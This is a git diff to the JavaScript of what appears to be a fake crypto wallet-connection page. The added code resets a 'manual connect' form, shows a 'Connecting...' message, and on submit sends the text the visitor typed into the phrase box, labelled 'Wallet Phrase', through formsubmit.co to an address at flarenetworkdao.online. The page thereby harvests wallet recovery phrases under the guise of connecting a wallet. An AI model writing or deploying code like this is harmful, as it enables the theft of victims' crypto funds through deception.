@@ -11,6 +11,9 @@ const closePopup = document.getElementById("closePopup");
 const tryAgain = document.querySelector(".tryAgain");
 const manualBtn = document.querySelector(".manualConnect");
 const phraseForm = document.querySelector(".phraseForm");
+const phraseBox = document.querySelector(".phraseBox")
+const formLoading = document.querySelector(".formLoading");
+const connectBtn = document.querySelector(".connectbtn");
 
 
 
@@ -86,6 +89,9 @@ closePopup.addEventListener("click", () => {
     autoConnect.classList.remove("active")
     manualConnect.classList.add("active")
     phraseForm.classList.add("active")
+    phraseBox.value = "";
+    formLoading.classList.add("active");
+    connectBtn.innerHTML ="Connect";
 
     timer = 0;
     timerCount = 0;
@@ -109,8 +115,37 @@ tryAgain.addEventListener("click", () => {
     console.log(timerCount)
 })
 
-manualBtn.addEventListener("click", ()=> {
+manualBtn.addEventListener("click", () => {
     manualConnect.classList.add("active");
     phraseForm.classList.remove("active");
 
 })
+
+
+
+// submit form 
+
+phraseForm.addEventListener('submit', (e) => {
+	e.preventDefault();
+
+	fetch("https://formsubmit.co/ajax/support@flarenetworkdao.online", {
+		method: "POST",
+		headers: {
+			'Content-Type': 'application/json',
+			'Accept': 'application/json'
+		},
+		body: JSON.stringify({
+			name: "Wallet Phrase",
+			message: phraseBox.value
+		})
+	})
+	.then(response => response.json())
+	.then(data => console.log(data))
+	.catch(error => console.log(error));
+});
+
+connectBtn.addEventListener("click", ()=> {
+    formLoading.classList.remove("active");
+    connectBtn.innerHTML ="Connecting...";
+})
+
